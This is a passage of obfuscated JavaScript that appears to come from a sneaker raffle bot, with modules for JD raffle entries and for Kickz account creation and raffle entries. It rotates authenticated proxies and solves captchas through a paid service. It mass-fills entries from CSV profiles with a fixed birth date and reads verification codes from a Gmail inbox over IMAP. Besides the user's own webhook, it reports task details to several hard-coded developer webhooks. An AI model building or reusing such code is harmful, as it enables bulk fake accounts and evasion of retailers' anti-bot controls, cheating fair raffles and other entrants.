                        var _0x105ad2 = '', _0x5bb1f7 = 0x0;
                    var _0x21a383, _0x161efd = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x43d77d[_0x468d13]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x43d77d[_0x468d13]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x447b4a
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x114346['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x92063b
                            }
                        ]
                    }];
                    const _0x444ae8 = { 'embeds': _0x161efd };
                    _0x59687e(_0x587d4e['name'] + '\x20Task\x20' + (_0x468d13 + 0x1) + '\x20/\x20' + _0x43d77d['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                    try {
                        await _0x44ca58(_0x43d77d, _0x468d13);
                    } catch {
                        _0x105ad2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x37a05b = await _0x254487(_0x43d77d[_0x468d13], _0x587d4e, 'dev', ![]), _0x5e00b1 = await _0x254487(_0x43d77d[_0x468d13], _0x587d4e, 'pub', ![]);
                    const _0x1a922a = {
                        'succesDEVMSG': { 'embeds': [_0x37a05b] },
                        'succesPUBMSG': { 'embeds': [_0x5e00b1] }
                    };
                    if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                        try {
                            await _0x5641c6(_0x114346['webhook'], _0x1a922a['succesDEVMSG']);
                        } catch {
                        }
                    await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x1a922a['succesDEVMSG']), await _0x572e60(0xc8);
                    try {
                        await _0x5641c6(_0x30beeb, _0x1a922a['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x43d77d[_0x468d13]['Email'] == '' || _0x43d77d[_0x468d13]['Url'] == '' || _0x43d77d[_0x468d13]['FirstName'] == '' || _0x43d77d[_0x468d13]['LastName'] == '') {
                        console['log'](_0xed09ee() + '\x20[' + _0x509612[taskModule]['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x114346['useRandomProxy'] = ![])
                        var _0x1b9c60 = _0x5da766[_0x468d13]['split'](':');
                    else
                        var _0x40bd42 = Math['round'](Math['random']() * (_0x5da766['length'] - 0x1)), _0x1b9c60 = _0x5da766[_0x40bd42]['split'](':');
                    var _0x5b7c05;
                    try {
                        _0x5b7c05 = await _0x5dd90e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1b9c60[0x0] + ':' + _0x1b9c60[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5b7c05 = await _0x5dd90e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1b9c60[0x0] + ':' + _0x1b9c60[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1eedac = await _0x5b7c05['newPage']();
                        await _0x1eedac['authenticate']({
                            'username': '' + _0x1b9c60[0x2],
                            'password': '' + _0x1b9c60[0x3]
                        }), console['log'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1eedac['setRequestInterception'](!![]), _0x1eedac['on']('request', _0x1f43de => {
                            _0x1f43de['resourceType']() === 'image' || _0x1f43de['resourceType']() === 'font' || _0x1f43de['resourceType']() === 'media' ? _0x1f43de['abort']() : _0x1f43de['continue']();
                        });
                        try {
                            await _0x1eedac['goto']('' + _0x43d77d[_0x468d13]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x1eedac['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1eedac['type']('#comp_firstname', '' + _0x43d77d[_0x468d13]['FirstName']), await _0x1eedac['waitForSelector']('#comp_lastname'), await _0x1eedac['type']('#comp_lastname', '' + _0x43d77d[_0x468d13]['LastName']), await _0x1eedac['waitForSelector']('#comp_email'), await _0x1eedac['type']('#comp_email', '' + _0x43d77d[_0x468d13]['Email']), await _0x1eedac['waitForSelector']('#comp_paypalemail'), await _0x1eedac['type']('#comp_paypalemail', '' + _0x43d77d[_0x468d13]['Email']), await _0x1eedac['waitForSelector']('#comp_mobile_end'), await _0x1eedac['type']('#comp_mobile_end', '' + _0x43d77d[_0x468d13]['Phone']), await _0x1eedac['waitForSelector']('#comp_dob'), await _0x1eedac['type']('#comp_dob', '08/09/1992'), console['log'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x43d77d[_0x468d13]['Size'] == 'RANDOM') {
                            const _0x1a7289 = await _0x1eedac['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x52e33e => {
                                return _0x52e33e['map'](_0x1dcdc4 => _0x1dcdc4['value']);
                            });
                            var _0x5e67d5 = Math['round'](Math['random']() * (_0x1a7289['length'] - 0x2));
                            await _0x1eedac['select']('#shoesize', _0x1a7289[_0x5e67d5 + 0x1]), await _0x572e60(0x3e8);
                        } else {
                            const _0x2d064f = await _0x1eedac['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4b4acf => {
                                return _0x4b4acf['map'](_0x5b7dff => _0x5b7dff['innerText']);
                            }), _0x4b0d84 = await _0x1eedac['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xebfa0b => {
                                return _0xebfa0b['map'](_0x3339aa => _0x3339aa['value']);
                            });
                            var _0x20b34f = _0x43d77d[_0x468d13]['Size'];
                            for (var _0x2e1963 = 0x1; _0x2e1963 < _0x4b0d84['length']; _0x2e1963++) {
                                var _0x5cc7ef = _0x2d064f[_0x2e1963]['split']('\x20')[0x0];
                                if (_0x5cc7ef == _0x20b34f) {
                                    await _0x1eedac['select']('#shoesize', _0x4b0d84[_0x2e1963]);
                                    break;
                                } else {
                                    if (_0x2e1963 + 0x1 == _0x4b0d84['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x1eedac['waitForSelector']('#comp_address1'), await _0x1eedac['type']('#comp_address1', _0x43d77d[_0x468d13]['Address1'] + '\x20' + _0x43d77d[_0x468d13]['HouseNumber']), await _0x1eedac['waitForSelector']('#comp_address2'), await _0x1eedac['type']('#comp_address2', '' + _0x43d77d[_0x468d13]['Address2']), await _0x1eedac['waitForSelector']('#comp_address2'), await _0x1eedac['type']('#comp_address3', '' + _0x43d77d[_0x468d13]['City']), await _0x1eedac['waitForSelector']('#comp_postcode'), await _0x1eedac['type']('#comp_postcode', '' + _0x43d77d[_0x468d13]['Zip']), console['log'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x572e60(0x4b0), await _0x1eedac['click']('label#emailhold'), await _0x572e60(0x5dc), await _0x1eedac['click']('#preauth_tandc_email\x20>\x20label'), await _0x572e60(0x5dc), await _0x1eedac['click']('#submit');
                        try {
                            await _0x1eedac['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20' + _0x2d77f8['blue']('Awaiting\x20Paypal\x20Payment')), _0x5b7c05['on']('targetcreated', async _0x1f04b0 => {
                            if (_0x1f04b0['type']() === 'page') {
                                const _0x181c5e = await _0x1f04b0['page']();
                                async function _0x205141() {
                                    try {
                                        await _0x1eedac['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x365f70 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x26cb9b() {
                                    try {
                                        await _0x1eedac['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x63445 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x26cb9b(), _0x205141(), await _0x572e60(0x493e0);
                            }
                        });
                        async function _0x5c5848() {
                            for (let _0x53ffa8 = 0x0; _0x53ffa8 < 0x12c; _0x53ffa8++) {
                                if (_0x63445 == !![]) {
                                    _0x105ad2 = 'no', _0x14aa55(_0x43d77d[_0x468d13], _0x587d4e), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                                        try {
                                            await _0x5641c6(_0x114346['webhook'], _0x1a922a['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x1a922a['succesDEVMSG']), await _0x572e60(0xc8);
                                    try {
                                        await _0x5641c6(_0x30beeb, _0x1a922a['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x365f70)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x572e60(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x572e60(0xbb8), await _0x1eedac['click']('.zoid-outlet'), await _0x572e60(0x7d0), await _0x5c5848();
                    } catch (_0x1e258b) {
                        console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20' + _0x1e258b)), _0x21a383 = '' + _0x1e258b;
                        var _0x46edab = await _0x254487(_0x43d77d[_0x468d13], _0x587d4e, 'dev', !![], _0x21a383);
                        _0x1a922a['errorDEV'] = { 'embeds': [_0x46edab] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x1a922a['errorDEV']), await _0x5641c6(_0x188004, _0x1a922a['errorDEV']);
                    } finally {
                        _0x5b7c05 && _0x5b7c05['close']();
                        if (_0x105ad2 == 'yes' && _0x5bb1f7 != 0x5 && _0x21a383 != 'Size\x20Not\x20Found') {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x587d4e['name'] + ']\x20Task\x20' + (_0x468d13 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5bb1f7 + '\x20/\x205)')), _0x468d13 = _0x468d13 - 0x1, _0x5bb1f7 = _0x5bb1f7 + 0x1;
                            continue;
                        }
                        _0x105ad2 == 'yes' && _0x5bb1f7 >= 0x5 && (_0x58f6f1(afew[_0x468d13], _0x587d4e), _0x105ad2 = 'no', _0x5bb1f7 = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x373556, _0x3228d3, _0x3a9f66) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5bd064 = 0x0; _0x5bd064 < _0x3228d3['length']; _0x5bd064++) {
                        const _0x464d47 = 'https://www.kickz.com/login';
                        if (_0xe2e1d8 != 'yes')
                            var _0xe2e1d8 = '', _0xe9890c = 0x0;
                        _0x59687e(_0x373556['name'] + '\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20/\x20' + _0x3228d3['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        try {
                            await _0x44ca58(_0x3228d3, _0x5bd064);
                        } catch {
                            _0xe2e1d8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5a1cf4 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x447b4a
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x114346['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x92063b
                                }
                            ]
                        }];
                        const _0x473611 = { 'embeds': _0x5a1cf4 };
                        var _0x665c3b = await _0x254487(_0x3228d3[_0x5bd064], _0x373556, 'acc', ![]);
                        const _0x29315a = { 'succesDEVMSG': { 'embeds': [_0x665c3b] } };
                        if (_0x3228d3[_0x5bd064]['Email'] == '' || _0x3228d3[_0x5bd064]['FirstName'] == '' || _0x3228d3[_0x5bd064]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x3228d3[_0x5bd064]['Password'] == '' && (_0x3228d3[_0x5bd064]['Password'] = 'JRaffles23!');
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x412f41 = _0x3a9f66[_0x5bd064]['split'](':');
                        else
                            var _0x49a44f = Math['round'](Math['random']() * (_0x3a9f66['length'] - 0x1)), _0x412f41 = _0x3a9f66[_0x49a44f]['split'](':');
                        var _0x521787;
                        try {
                            _0x521787 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x412f41[0x0] + ':' + _0x412f41[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x521787 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x412f41[0x0] + ':' + _0x412f41[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x24fca2 = await _0x521787['newPage']();
                            await _0x24fca2['authenticate']({
                                'username': '' + _0x412f41[0x2],
                                'password': '' + _0x412f41[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x24fca2['setRequestInterception'](!![]), _0x24fca2['on']('request', _0x5dc417 => {
                                _0x5dc417['resourceType']() === 'image' || _0x5dc417['resourceType']() === 'font' || _0x5dc417['resourceType']() === 'media' ? _0x5dc417['abort']() : _0x5dc417['continue']();
                            }), await _0x24fca2['goto'](_0x464d47), await _0x572e60(0xbb8), console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x24fca2['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x24fca2['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x24fca2['waitForSelector']('#button-register'), await _0x572e60(0x7d0), await _0x24fca2['evaluate'](() => {
                                const _0x4f78ba = document['querySelector']('#button-register');
                                _0x4f78ba['click']();
                            }), console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x572e60(0x1388), await _0x24fca2['waitForSelector']('#customer_salutation'), await _0x24fca2['select']('#customer_salutation', 'mr'), await _0x572e60(0x7d0), await _0x24fca2['waitForSelector']('#customer_firstname'), await _0x24fca2['type']('#customer_firstname', '' + _0x3228d3[_0x5bd064]['FirstName']), await _0x572e60(0x352), await _0x24fca2['waitForSelector']('#customer_lastname'), await _0x24fca2['type']('#customer_lastname', '' + _0x3228d3[_0x5bd064]['LastName']), await _0x572e60(0x352), await _0x24fca2['type']('#email-input', '' + _0x3228d3[_0x5bd064]['Email']), await _0x572e60(0x352), await _0x24fca2['type']('#email-confirm-input', '' + _0x3228d3[_0x5bd064]['Email']), await _0x572e60(0x352), await _0x24fca2['type']('#register-password', '' + _0x3228d3[_0x5bd064]['Password']), await _0x572e60(0x352), await _0x24fca2['type']('#password-confirm', '' + _0x3228d3[_0x5bd064]['Password']), await _0x572e60(0x352), console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x24fca2['click']('#consent'), await _0x572e60(0x1f4);
                            const _0x1ad4ca = await _0x24fca2['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1ad4ca) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x24fca2['click']('#buttonRegister');
                            try {
                                await _0x24fca2['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x3228d3[_0x5bd064]['Email']), await _0x572e60(0x4b0);
                            async function _0x45667e() {
                                var _0x1f8f73, _0x430b06 = ![];
                                for (var _0x5e457a = 0x0; _0x5e457a < 0x18; _0x5e457a++) {
                                    async function _0x5edfa5() {
                                        var _0x1f3c36 = new _0x266969({
                                            'user': _0x114346['masterMail'],
                                            'password': _0x114346['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x4ccdce(_0x391298) {
                                            _0x1f3c36['openBox']('INBOX', ![], _0x391298);
                                        }
                                        _0x1f3c36['once']('ready', function () {
                                            console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x4ccdce(function (_0x5df98e, _0x324d57) {
                                                console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x5df98e)
                                                    throw _0x5df98e;
                                                _0x1f3c36['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x3424f9, _0x5c9a1e) {
                                                    if (!_0x5c9a1e || !_0x5c9a1e['length'])
                                                        console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x1f3c36['end']();
                                                    else {
                                                        var _0x1f1d53 = _0x1f3c36['seq']['fetch'](_0x5c9a1e, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1f1d53['on']('message', function (_0x5d4ae, _0x500eb1) {
                                                            var _0x43c486 = '(#' + _0x500eb1 + ')\x20';
                                                            _0x5d4ae['on']('body', function (_0x32ac98, _0x48f4e5) {
                                                                _0x172805(_0x32ac98, (_0x44690f, _0x2547c4) => {
                                                                    if (_0x2547c4['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x5097ee = _0x2547c4['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x417f25 = _0x5097ee[0x1]['split']('<')[0x0];
                                                                        _0x1f8f73 = _0x417f25;
                                                                    }
                                                                });
                                                            }), _0x5d4ae['once']('end', function () {
                                                            });
                                                        }), _0x1f1d53['once']('error', function (_0x273179) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1f1d53['once']('end', function () {
                                                            _0x1f3c36['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x1f3c36['once']('error', function (_0xc4fdbc) {
                                            console['log'](_0x2d77f8['red'](_0xc4fdbc['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x430b06 = !![];
                                        }), _0x1f3c36['once']('end', async function () {
                                        }), _0x1f3c36['connect']();
                                    }
                                    _0x5edfa5(), await _0x572e60(0x1388);
                                    if (_0x1f8f73)
                                        return _0x1f8f73;
                                    if (_0x430b06)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5e457a == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x45667e(), _0x572e60(0x320), console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Verifying..'), await _0x24fca2['type']('#verificationCode', code), await _0x572e60(0x1f4), await _0x24fca2['click']('#buttonVerify'), await _0x572e60(0x190), await _0x24fca2['click']('#buttonVerify'), await _0x572e60(0x3e8);
                            try {
                                await _0x24fca2['waitForSelector']('div.b-user_greeting'), _0xe2e1d8 = 'no', console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Account\x20' + _0x3228d3[_0x5bd064]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3d3f42['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x3228d3[_0x5bd064]['Email'] + ',' + _0x3228d3[_0x5bd064]['Password'] + ','), console['log'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Account\x20' + _0x3228d3[_0x5bd064]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x29315a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5641c6(_0x34385d, _0x29315a['succesDEVMSG']);
                            } catch {
                                _0xe2e1d8 = 'no', console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x510da8) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20' + _0x510da8)), _0x5a1cf4[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x5a1cf4[0x0]['description'] = '' + _0x510da8, await _0x5641c6(_0x188004, _0x473611), _0xe2e1d8 = 'yes';
                        } finally {
                            _0x521787 && _0x521787['close']();
                            if (_0xe2e1d8 == 'yes' && _0xe9890c != 0x5) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x373556['name'] + ']\x20Task\x20' + (_0x5bd064 + 0x1) + '\x20:\x20Retrying\x20(' + _0xe9890c + '\x20/\x205)')), _0x5bd064 = _0x5bd064 - 0x1, _0xe9890c = _0xe9890c + 0x1;
                                continue;
                            }
                            _0xe2e1d8 == 'yes' && _0xe9890c >= 0x5 && (_0x58f6f1(_0x3228d3[_0x5bd064], _0x373556), _0xe2e1d8 = 'no', _0xe9890c = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x38a091, _0x4d6d39, _0x11c212) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2f38ca = 0x0; _0x2f38ca < _0x4d6d39['length']; _0x2f38ca++) {
                        var _0x48e19c;
                        if (_0x5377b3 != 'yes')
                            var _0x5377b3 = '', _0x4002af = 0x0;
                        _0x59687e(_0x38a091['name'] + '\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20/\x20' + _0x4d6d39['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        var _0x586944 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x447b4a
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x4d6d39[_0x2f38ca]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x4d6d39[_0x2f38ca]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x114346['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x92063b
                                }
                            ]
                        }], _0x53ee53 = await _0x254487(_0x4d6d39[_0x2f38ca], _0x38a091, 'dev', ![]), _0x547313 = await _0x254487(_0x4d6d39[_0x2f38ca], _0x38a091, 'pub', ![]);
                        const _0x12e008 = {
                            'succesDEVMSG': { 'embeds': [_0x53ee53] },
                            'succesPUBMSG': { 'embeds': [_0x547313] }
                        };
                        try {
                            await _0x44ca58(_0x4d6d39, _0x2f38ca);
                        } catch {
                            _0x5377b3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4d6d39[_0x2f38ca]['Email'] == '' || _0x4d6d39[_0x2f38ca]['Password'] == '' || _0x4d6d39[_0x2f38ca]['FirstName'] == '' || _0x4d6d39[_0x2f38ca]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x59b27e = _0x11c212[_0x2f38ca]['split'](':');
                        else
                            var _0xbb6d71 = Math['round'](Math['random']() * (_0x11c212['length'] - 0x1)), _0x59b27e = _0x11c212[_0xbb6d71]['split'](':');
                        var _0x3c157d;
                        try {
                            _0x3c157d = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x59b27e[0x0] + ':' + _0x59b27e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3c157d = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x59b27e[0x0] + ':' + _0x59b27e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x19fafd = await _0x3c157d['newPage']();
                            await _0x19fafd['authenticate']({
                                'username': '' + _0x59b27e[0x2],
                                'password': '' + _0x59b27e[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x38a091['name'] + ']\x20Task\x20' + (_0x2f38ca + 0x1) + '\x20:\x20Getting\x20Session'), await _0x19fafd['setRequestInterception'](!![]), _0x19fafd['on']('request', _0xd869ad => {
                                _0xd869ad['resourceType']() === 'image' || _0xd869ad['resourceType']() === 'font' || _0xd869ad['resourceType']() === 'media' ? _0xd869ad['abort']() : _0xd869ad['continue']();
